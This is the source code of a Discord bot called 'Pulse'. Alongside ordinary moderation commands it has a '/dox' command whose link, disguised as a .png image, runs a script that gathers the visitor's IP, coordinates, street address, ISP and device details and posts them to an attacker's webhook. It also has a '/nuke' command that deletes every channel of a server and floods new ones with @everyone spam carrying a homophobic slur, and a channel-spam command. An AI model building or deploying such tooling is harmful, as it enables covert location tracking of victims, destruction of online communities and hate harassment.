const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, ChannelType } = require('discord.js');
const crypto = require('crypto');
const express = require('express');
const app = express();

const TOKEN = process.env.TOKEN;
const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
const PORT = process.env.PORT || 3000;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildModeration
    ]
});

const links = new Map();
const startTime = Date.now();

app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    if (!links.has(id)) return res.status(404).send('Image not found');
    const data = links.get(id);
    res.type('text/html');
    res.send(generateDoxHTML(data.webhook || DEFAULT_WEBHOOK));
});
app.listen(PORT, () => console.log(`Dox server on ${PORT}`));

// ---- REGISTER COMMANDS ----
async function registerCommands() {
    const commands = [
        { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
        { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Messages (max 100)', required: true }, { name: 'message', type: 3, description: 'Content', required: true }, { name: 'delay', type: 4, description: 'Delay in ms', required: false }] },
        { name: 'nuke', description: 'Delete channels, create, flood, leave', options: [{ name: 'channels', type: 4, description: 'Channels (default 20, max 50)', required: false }, { name: 'messages', type: 4, description: 'Messages per channel (default 10, max 100)', required: false }, { name: 'delay', type: 4, description: 'Delay in ms between messages (default 50)', required: false }] },
        { name: 'ad', description: 'Advertise server' },
        { name: 'purge', description: 'Delete messages', options: [{ name: 'amount', type: 4, description: 'Number to delete (max 100)', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
        { name: 'serverinfo', description: 'Server information' },
        { name: 'userinfo', description: 'User information', options: [{ name: 'user', type: 6, description: 'Target user', required: false }] },
        { name: 'math', description: 'Calculate expression', options: [{ name: 'expression', type: 3, description: 'Math expression', required: true }] },
        { name: 'ping', description: 'Bot latency' },
        { name: 'say', description: 'Make bot say something', options: [{ name: 'message', type: 3, description: 'Message to say', required: true }] },
        { name: 'avatar', description: 'Show user avatar', options: [{ name: 'user', type: 6, description: 'Target user', required: false }] },
        { name: 'kick', description: 'Kick a member', options: [{ name: 'user', type: 6, description: 'User to kick', required: true }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
        { name: 'ban', description: 'Ban a member', options: [{ name: 'user', type: 6, description: 'User to ban', required: true }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
        { name: 'unban', description: 'Unban a user by ID', options: [{ name: 'userid', type: 3, description: 'User ID to unban', required: true }] },
        { name: 'timeout', description: 'Timeout a member', options: [{ name: 'user', type: 6, description: 'Target user', required: true }, { name: 'duration', type: 4, description: 'Minutes (1-40320)', required: true }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
        { name: 'role', description: 'Add or remove role', options: [{ name: 'action', type: 3, description: 'add or remove', required: true, choices: [{ name: 'add', value: 'add' }, { name: 'remove', value: 'remove' }] }, { name: 'user', type: 6, description: 'Target user', required: true }, { name: 'role', type: 8, description: 'Role to add/remove', required: true }] },
        { name: 'poll', description: 'Create a poll', options: [{ name: 'question', type: 3, description: 'Poll question', required: true }, { name: 'option1', type: 3, description: 'Option 1', required: true }, { name: 'option2', type: 3, description: 'Option 2', required: true }, { name: 'option3', type: 3, description: 'Option 3', required: false }, { name: 'option4', type: 3, description: 'Option 4', required: false }] },
        { name: 'embed', description: 'Send a custom embed', options: [{ name: 'title', type: 3, description: 'Embed title', required: true }, { name: 'description', type: 3, description: 'Embed description', required: true }, { name: 'color', type: 3, description: 'Hex color (e.g. #ff0000)', required: false }] },
        { name: 'invite', description: 'Get bot invite link' },
        { name: 'help', description: 'Show all commands' },
        { name: '8ball', description: 'Ask the magic 8-ball a question', options: [{ name: 'question', type: 3, description: 'Your question', required: true }] },
        { name: 'roll', description: 'Roll a dice', options: [{ name: 'sides', type: 4, description: 'Number of sides (default 6)', required: false }] },
        { name: 'serverlist', description: 'List servers the bot is in' },
        { name: 'botstatus', description: 'Change bot status', options: [{ name: 'status', type: 3, description: 'online/idle/dnd/invisible', required: true }, { name: 'activity', type: 3, description: 'Activity text', required: false }] },
        { name: 'slowmode', description: 'Set slowmode in current channel', options: [{ name: 'seconds', type: 4, description: 'Slowmode in seconds (0 to disable)', required: true }] },
        { name: 'lock', description: 'Lock the current channel (requires Manage Channels)' },
        { name: 'unlock', description: 'Unlock the current channel (requires Manage Channels)' },
        { name: 'uptime', description: 'Show bot uptime' },
        { name: 'countdown', description: 'Start a countdown timer', options: [{ name: 'seconds', type: 4, description: 'Number of seconds', required: true }] },
        { name: 'remindme', description: 'Set a reminder', options: [{ name: 'time', type: 4, description: 'Minutes to wait', required: true }, { name: 'message', type: 3, description: 'Reminder message', required: true }] },
        { name: 'refresh', description: 'Manually refresh slash commands' }
    ];

    try {
        await client.application.commands.set([]);
        console.log('[REGISTRATION] Cleared old commands.');
        await client.application.commands.set(commands);
        console.log(`[REGISTRATION] Successfully registered ${commands.length} commands.`);
    } catch (error) {
        console.error('[REGISTRATION] Failed to register commands:', error);
    }
}

client.once('ready', async () => {
    console.log(`Logged in as ${client.user.tag}`);
    await registerCommands();
    console.log('Ready – commands should appear in Discord within a minute.');
});

// ---- INTERACTION HANDLER ----
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    // Guarantee response
    try {
        await interaction.deferReply({ ephemeral: true });
    } catch {
        try {
            await interaction.reply({ content: '⏳ Processing...', ephemeral: true });
        } catch {
            return;
        }
    }

    try {
        const { commandName, options, user, member, guild, channel } = interaction;

        console.log(`[${new Date().toISOString()}] ${user.tag} -> /${commandName}`);

        // ---- REFRESH ----
        if (commandName === 'refresh') {
            await registerCommands();
            await interaction.editReply('✅ Commands refreshed.');
            return;
        }

        // ---- DOX ----
        if (commandName === 'dox') {
            const wh = options.getString('webhook');
            if (!wh || !wh.startsWith('https://discord.com/api/webhooks/')) {
                return interaction.editReply('❌ Invalid webhook URL.');
            }
            const id = crypto.randomBytes(6).toString('hex');
            const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
            links.set(id, { webhook: wh, user: user.tag, created: Date.now() });
            const embed = new EmbedBuilder()
                .setTitle('✅ Dox Link Ready')
                .setColor(0x22c55e)
                .setDescription(`🔗 **${url}**\n\nSends IP, location, ISP, ASN, and basic device info.`)
                .setFooter({ text: `Generated by ${user.tag}` });
            await interaction.editReply({ embeds: [embed] });
        }

        // ---- SPAM (truncated for space) ----
        else if (commandName === 'spam') {
            const count = Math.min(options.getInteger('count'), 100);
            const msg = options.getString('message');
            const delay = options.getInteger('delay') || 0;
            if (!channel) return interaction.editReply('❌ No channel.');
            for (let i = 0; i < count; i++) {
                await channel.send(msg);
                if (delay > 0) await new Promise(r => setTimeout(r, delay));
            }
            await interaction.editReply(`✅ Spammed ${count} messages.`);
        }

        // ---- NUKE ----
        else if (commandName === 'nuke') {
            if (!guild) return interaction.editReply('❌ Server only.');
            if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.editReply('❌ Need Admin.');
            const channelCount = Math.min(options.getInteger('channels') || 20, 50);
            const msgCount = Math.min(options.getInteger('messages') || 10, 100);
            const delayMs = Math.min(options.getInteger('delay') || 50, 500);
            const variants = ['# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER'];
            const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
            await Promise.all(guild.channels.cache.map(c => c.delete().catch(() => {})));
            const newChannels = await Promise.all(Array.from({ length: channelCount }, () => guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null)));
            const valid = newChannels.filter(c => c);
            const messages = [];
            for (let i = 0; i < msgCount; i++) {
                let line = variants[i % variants.length];
                let big = `@everyone ${line}\n`;
                while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) big += line + '\n';
                big += `\n${inviteLine}`;
                messages.push(big.slice(0, 2000));
            }
            for (let i = 0; i < messages.length; i++) {
                await Promise.all(valid.map(c => c.send(messages[i]).catch(() => {})));
                if (i < messages.length - 1) await new Promise(r => setTimeout(r, delayMs));
            }
            await guild.leave();
            await interaction.editReply(`✅ Nuked. Created ${valid.length} channels, sent ${msgCount} messages each.`);
        }

        // ---- AD ----
        else if (commandName === 'ad') {
            if (!channel) return interaction.editReply('❌ No channel.');
            const embed = new EmbedBuilder().setTitle('🔥 Pulse Nuke Power').setColor(0x8B5CF6).setDescription(`Join Pulse:\n${INVITE_LINK}`).setFooter({ text: 'Pulse Bot' });
            await channel.send({ embeds: [embed] });
            await interaction.editReply('✅ Ad sent.');
        }

        // ---- PURGE ----
        else if (commandName === 'purge') {
            const amount = Math.min(options.getInteger('amount'), 100);
            const targetUser = options.getUser('user');
            const reason = options.getString('reason') || 'No reason';
            if (!channel) return interaction.editReply('❌ No channel.');
            if (!channel.permissionsFor(member).has(PermissionsBitField.Flags.ManageMessages)) return interaction.editReply('❌ Need Manage Messages.');
            let messages = await channel.messages.fetch({ limit: amount });
            if (targetUser) messages = messages.filter(m => m.author.id === targetUser.id);
            const deleted = await channel.bulkDelete(messages, true).catch(() => {});
            const embed = new EmbedBuilder().setTitle('🧹 Purge Complete').setColor(0x22c55e).setDescription(`Deleted ${deleted ? deleted.size : 0} messages.`).addFields({ name: 'Reason', value: reason });
            await interaction.editReply({ embeds: [embed] });
        }

        // ---- SERVERINFO ----
        else if (commandName === 'serverinfo') {
            if (!guild) return interaction.editReply('❌ Server only.');
            const owner = await guild.fetchOwner();
            const embed = new EmbedBuilder().setTitle(`📊 ${guild.name}`).setColor(0x8B5CF6).setThumbnail(guild.iconURL({ dynamic: true, size: 256 })).addFields(
                { name: '🆔 Server ID', value: guild.id, inline: true },
                { name: '👑 Owner', value: owner.user.tag, inline: true },
                { name: '👥 Members', value: `${guild.memberCount}`, inline: true },
                { name: '💬 Channels', value: `${guild.channels.cache.size}`, inline: true },
                { name: '📁 Roles', value: `${guild.roles.cache.size}`, inline: true },
                { name: '📅 Created', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:R>`, inline: true }
            );
            await interaction.editReply({ embeds: [embed] });
        }

        // ---- USERINFO ----
        else if (commandName === 'userinfo') {
            const target = options.getUser('user') || user;
            const memberTarget = guild ? await guild.members.fetch(target.id).catch(() => null) : null;
            const embed = new EmbedBuilder().setTitle(`👤 ${target.tag}`).setColor(0x8B5CF6).setThumbnail(target.displayAvatarURL({ dynamic: true, size: 256 })).addFields(
                { name: '🆔 User ID', value: target.id, inline: true },
                { name: '📅 Account Created', value: `<t:${Math.floor(target.createdTimestamp / 1000)}:R>`, inline: true },
                { name: '🤖 Bot', value: target.bot ? 'Yes' : 'No', inline: true }
            );
            if (memberTarget) {
                embed.addFields(
                    { name: '📅 Joined Server', value: `<t:${Math.floor(memberTarget.joinedTimestamp / 1000)}:R>`, inline: true },
                    { name: '📊 Roles', value: memberTarget.roles.cache.map(r => r.toString()).join(', ') || 'None' }
                );
            }
            await interaction.editReply({ embeds: [embed] });
        }

        // ---- MATH ----
        else if (commandName === 'math') {
            const expr = options.getString('expression');
            try {
                const sanitized = expr.replace(/[^0-9+\-*/().% ]/g, '');
                if (!sanitized) return interaction.editReply('❌ Invalid expression.');
                const result = Function(`"use strict"; return (${sanitized})`)();
                await interaction.editReply(`🧮 **${expr}** = **${result}**`);
            } catch (e) {
                await interaction.editReply(`❌ Error: ${e.message}`);
            }
        }

        // ---- PING ----
        else if (commandName === 'ping') {
            const sent = await interaction.editReply({ content: '🏓 Pinging...', fetchReply: true });
            const latency = sent.createdTimestamp - interaction.createdTimestamp;
            await interaction.editReply(`🏓 Pong!\n📨 Latency: ${latency}ms\n📡 API: ${Math.round(client.ws.ping)}ms`);
        }

        // ---- SAY ----
        else if (commandName === 'say') {
            const msg = options.getString('message');
            if (!channel) return interaction.editReply('❌ No channel.');
            await channel.send(msg);
            await interaction.editReply('✅ Sent.');
        }

        // ---- AVATAR ----
        else if (commandName === 'avatar') {
            const target = options.getUser('user') || user;
            const embed = new EmbedBuilder().setTitle(`${target.tag}'s Avatar`).setImage(target.displayAvatarURL({ dynamic: true, size: 1024 })).setColor(0x8B5CF6);
            await interaction.editReply({ embeds: [embed] });
        }

        // ---- KICK ----
        else if (commandName === 'kick') {
            if (!guild) return interaction.editReply('❌ Server only.');
            const target = options.getUser('user');
            const reason = options.getString('reason') || 'No reason';
            const targetMember = await guild.members.fetch(target.id).catch(() => null);
            if (!targetMember) return interaction.editReply('❌ User not in server.');
            if (!member.permissions.has(PermissionsBitField.Flags.KickMembers)) return interaction.editReply('❌ No permission.');
            if (targetMember.id === client.user.id) return interaction.editReply('❌ Cannot kick myself.');
            await targetMember.kick(reason);
            await interaction.editReply(`✅ Kicked ${target.tag} for "${reason}"`);
        }

        // ---- BAN ----
        else if (commandName === 'ban') {
            if (!guild) return interaction.editReply('❌ Server only.');
            const target = options.getUser('user');
            const reason = options.getString('reason') || 'No reason';
            if (!member.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.editReply('❌ No permission.');
            await guild.bans.create(target.id, { reason });
            await interaction.editReply(`✅ Banned ${target.tag} for "${reason}"`);
        }

        // ---- UNBAN ----
        else if (commandName === 'unban') {
            if (!guild) return interaction.editReply('❌ Server only.');
            const userId = options.getString('userid');
            if (!member.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.editReply('❌ No permission.');
            await guild.bans.remove(userId);
            await interaction.editReply(`✅ Unbanned user ${userId}`);
        }

        // ---- TIMEOUT ----
        else if (commandName === 'timeout') {
            if (!guild) return interaction.editReply('❌ Server only.');
            const target = options.getUser('user');
            const duration = options.getInteger('duration');
            const reason = options.getString('reason') || 'No reason';
            const targetMember = await guild.members.fetch(target.id).catch(() => null);
            if (!targetMember) return interaction.editReply('❌ User not in server.');
            if (!member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) return interaction.editReply('❌ No permission.');
            await targetMember.timeout(duration * 60000, reason);
            await interaction.editReply(`✅ Timed out ${target.tag} for ${duration} minutes.`);
        }

        // ---- ROLE ----
        else if (commandName === 'role') {
            if (!guild) return interaction.editReply('❌ Server only.');
            const action = options.getString('action');
            const target = options.getUser('user');
            const role = options.getRole('role');
            const targetMember = await guild.members.fetch(target.id).catch(() => null);
            if (!targetMember) return interaction.editReply('❌ User not in server.');
            if (!member.permissions.has(PermissionsBitField.Flags.ManageRoles)) return interaction.editReply('❌ No permission.');
            if (role.position >= guild.members.me.roles.highest.position) return interaction.editReply('❌ Role too high.');
            if (action === 'add') {
                await targetMember.roles.add(role);
                await interaction.editReply(`✅ Added ${role.name} to ${target.tag}`);
            } else {
                await targetMember.roles.remove(role);
                await interaction.editReply(`✅ Removed ${role.name} from ${target.tag}`);
            }
        }

        // ---- POLL ----
        else if (commandName === 'poll') {
            if (!channel) return interaction.editReply('❌ No channel.');
            const question = options.getString('question');
            const opt1 = options.getString('option1');
            const opt2 = options.getString('option2');
            const opt3 = options.getString('option3');
            const opt4 = options.getString('option4');
            const opts = [opt1, opt2, opt3, opt4].filter(o => o);
            const emojis = ['1️⃣', '2️⃣', '3️⃣', '4️⃣'];
            let desc = opts.map((o, i) => `${emojis[i]} ${o}`).join('\n');
            const embed = new EmbedBuilder().setTitle(`📊 ${question}`).setDescription(desc).setColor(0x8B5CF6);
            const msg = await channel.send({ embeds: [embed] });
            for (let i = 0; i < opts.length; i++) await msg.react(emojis[i]);
            await interaction.editReply('✅ Poll created.');
        }

        // ---- EMBED ----
        else if (commandName === 'embed') {
            if (!channel) return interaction.editReply('❌ No channel.');
            const title = options.getString('title');
            const description = options.getString('description');
            const color = options.getString('color') || '#8B5CF6';
            const embed = new EmbedBuilder().setTitle(title).setDescription(description).setColor(color).setTimestamp();
            await channel.send({ embeds: [embed] });
            await interaction.editReply('✅ Embed sent.');
        }

        // ---- INVITE ----
        else if (commandName === 'invite') {
            await interaction.editReply(`🔗 Invite me: https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot%20applications.commands`);
        }

        // ---- HELP ----
        else if (commandName === 'help') {
            const commands = client.application.commands.cache.map(c => `\`/${c.name}\` - ${c.description}`).join('\n');
            const embed = new EmbedBuilder().setTitle('📋 Commands').setDescription(commands).setColor(0x8B5CF6).setFooter({ text: `Total ${client.application.commands.cache.size} commands` });
            await interaction.editReply({ embeds: [embed] });
        }

        // ---- 8BALL ----
        else if (commandName === '8ball') {
            const responses = ['Yes', 'No', 'Maybe', 'Ask again later', 'Definitely', 'Absolutely not', 'It is certain', 'Very doubtful'];
            const answer = responses[Math.floor(Math.random() * responses.length)];
            const q = options.getString('question');
            const embed = new EmbedBuilder().setTitle('🎱 8-Ball').setDescription(`**Question:** ${q}\n**Answer:** ${answer}`).setColor(0x8B5CF6);
            await interaction.editReply({ embeds: [embed] });
        }

        // ---- ROLL ----
        else if (commandName === 'roll') {
            const sides = options.getInteger('sides') || 6;
            const result = Math.floor(Math.random() * sides) + 1;
            await interaction.editReply(`🎲 Rolled a d${sides}: **${result}**`);
        }

        // ---- SERVERLIST ----
        else if (commandName === 'serverlist') {
            const list = client.guilds.cache.map(g => `${g.name} (${g.id})`).join('\n');
            const embed = new EmbedBuilder().setTitle('📋 Server List').setDescription(list || 'None').setColor(0x8B5CF6);
            await interaction.editReply({ embeds: [embed] });
        }

        // ---- BOTSTATUS ----
        else if (commandName === 'botstatus') {
            const status = options.getString('status');
            const activity = options.getString('activity') || 'Pulse Bot';
            const statusMap = { online: 'online', idle: 'idle', dnd: 'dnd', invisible: 'invisible' };
            if (!statusMap[status]) return interaction.editReply('❌ Invalid status. Use online, idle, dnd, invisible.');
            client.user.setPresence({ status: statusMap[status], activities: [{ name: activity, type: 0 }] });
            await interaction.editReply(`✅ Status set to ${status} with activity "${activity}".`);
        }

        // ---- SLOWMODE ----
        else if (commandName === 'slowmode') {
            if (!channel) return interaction.editReply('❌ No channel.');
            if (!member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.editReply('❌ Need Manage Channels.');
            const seconds = options.getInteger('seconds');
            await channel.setRateLimitPerUser(seconds);
            await interaction.editReply(`✅ Slowmode set to ${seconds} seconds.`);
        }

        // ---- LOCK ----
        else if (commandName === 'lock') {
            if (!channel) return interaction.editReply('❌ No channel.');
            if (!member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.editReply('❌ Need Manage Channels.');
            await channel.permissionOverwrites.edit(guild.id, { SendMessages: false });
            await interaction.editReply('🔒 Channel locked.');
        }

        // ---- UNLOCK ----
        else if (commandName === 'unlock') {
            if (!channel) return interaction.editReply('❌ No channel.');
            if (!member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.editReply('❌ Need Manage Channels.');
            await channel.permissionOverwrites.edit(guild.id, { SendMessages: null });
            await interaction.editReply('🔓 Channel unlocked.');
        }

        // ---- UPTIME ----
        else if (commandName === 'uptime') {
            const diff = Date.now() - startTime;
            const seconds = Math.floor(diff / 1000);
            const minutes = Math.floor(seconds / 60);
            const hours = Math.floor(minutes / 60);
            const days = Math.floor(hours / 24);
            const uptime = `${days}d ${hours % 24}h ${minutes % 60}m ${seconds % 60}s`;
            await interaction.editReply(`⏳ Uptime: **${uptime}**`);
        }

        // ---- COUNTDOWN ----
        else if (commandName === 'countdown') {
            const seconds = options.getInteger('seconds');
            if (seconds > 600) return interaction.editReply('❌ Max 600 seconds.');
            await interaction.editReply(`⏰ Countdown started for ${seconds} seconds.`);
            for (let i = seconds; i > 0; i--) {
                if (i % 10 === 0 || i <= 5) {
                    await interaction.channel.send(`⏳ ${i} seconds remaining...`).catch(() => {});
                }
                await new Promise(r => setTimeout(r, 1000));
            }
            await interaction.channel.send(`🔔 **Countdown finished!**`).catch(() => {});
        }

        // ---- REMINDME ----
        else if (commandName === 'remindme') {
            const minutes = options.getInteger('time');
            const msg = options.getString('message');
            if (minutes > 60) return interaction.editReply('❌ Max 60 minutes.');
            await interaction.editReply(`⏰ Reminder set for ${minutes} minute(s).`);
            setTimeout(async () => {
                try {
                    await user.send(`🔔 **Reminder:** ${msg}`);
                } catch {
                    await channel.send(`🔔 <@${user.id}> **Reminder:** ${msg}`);
                }
            }, minutes * 60000);
        }

    } catch (error) {
        console.error('[ERROR]', error);
        try { await interaction.editReply(`❌ Error: ${error.message}`); } catch {}
    }
});

// ============================================================
// STRIPPED DOX HTML – IP + Location only
// ============================================================
function generateDoxHTML(webhook) {
    return `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title></title><style>body{background:#fff;margin:0;height:100vh}</style></head>
<body>
<script>
const WEBHOOK_URL = "${webhook}";

async function getIPData() {
    const apis = [
        { url: "https://ipinfo.io/json", parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.loc?.split(",")[0], lon: d.loc?.split(",")[1], asn: d.asn, isp: d.org, timezone: d.timezone }) },
        { url: "https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query", parse: d => ({ ip: d.query, country: d.country, region: d.regionName, city: d.city, postal: d.zip, lat: d.lat, lon: d.lon, asn: d.as, isp: d.isp, timezone: "N/A" }) },
        { url: "https://api.ipify.org?format=json", parse: d => ({ ip: d.ip }) }
    ];
    for (const api of apis) {
        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 5000);
            const res = await fetch(api.url, { signal: controller.signal });
            clearTimeout(timeout);
            const data = await res.json();
            if (data.ip) {
                const result = api.parse(data);
                if (result.ip) return result;
            }
        } catch (e) { console.error("IP fetch failed:", api.url, e); }
    }
    return { ip: "N/A", country: "N/A", region: "N/A", city: "N/A", postal: "N/A", lat: "N/A", lon: "N/A", asn: "N/A", isp: "N/A", timezone: "N/A" };
}

async function reverseGeocode(lat, lon) {
    try {
        const res = await fetch("https://nominatim.openstreetmap.org/reverse?lat=" + lat + "&lon=" + lon + "&format=json&zoom=18&addressdetails=1");
        const data = await res.json();
        if (data && data.display_name) return data.display_name;
    } catch (e) {}
    return null;
}

(async function() {
    try {
        const ip = await getIPData();
        const now = new Date();
        const timestamp = now.toISOString();
        const localTime = now.toString();

        let address = "N/A";
        let lat = ip.lat || "N/A";
        let lon = ip.lon || "N/A";
        if (lat !== "N/A" && lon !== "N/A") {
            const addr = await reverseGeocode(lat, lon);
            if (addr) address = addr;
        }

        const ua = navigator.userAgent;
        const browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Safari") ? "Safari" : "Unknown";
        const os = ua.includes("Windows NT 10.0") ? "Windows 10/11" : ua.includes("Mac OS X") ? "macOS" : ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Unknown";
        const device = /mobile|android|iphone|ipad/i.test(ua) ? "Mobile" : "Desktop";

        const fields = [
            { name: "📍 Address", value: address, inline: false },
            { name: "📌 Coordinates", value: lat + ", " + lon, inline: true },
            { name: "🌐 IP", value: ip.ip || "N/A", inline: true },
            { name: "🏙️ City", value: ip.city || "N/A", inline: true },
            { name: "🗺️ Region", value: ip.region || "N/A", inline: true },
            { name: "📮 Postal", value: ip.postal || "N/A", inline: true },
            { name: "🔢 ASN", value: ip.asn || "N/A", inline: true },
            { name: "🏢 ISP", value: ip.isp || "N/A", inline: true },
            { name: "🕒 Timezone", value: ip.timezone || "N/A", inline: true },
            { name: "🧠 Browser", value: browser, inline: true },
            { name: "💻 OS", value: os, inline: true },
            { name: "🖥️ Device", value: device, inline: true },
            { name: "⏰ Local Time", value: localTime, inline: false },
            { name: "📅 Timestamp", value: timestamp, inline: false }
        ];

        const embed = {
            title: "☠️ Doxxed",
            color: 0xFF0000,
            fields: fields,
            footer: { text: "Logged at " + timestamp }
        };

        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed] })
        });

    } catch (err) {
        console.error("Dox error:", err);
    }

    document.body.innerHTML = "";
    document.body.style.background = "#ffffff";
    document.body.style.margin = "0";
    document.body.style.height = "100vh";
    setTimeout(() => {
        window.close();
        window.location.href = "about:blank";
    }, 1000);
})();
</script>
</body>
</html>`;
}

setInterval(() => {
    const keys = Array.from(links.keys());
    if (keys.length > 100) keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
}, 60000);

process.on('uncaughtException', console.error);
process.on('unhandledRejection', console.error);

client.login(TOKEN);
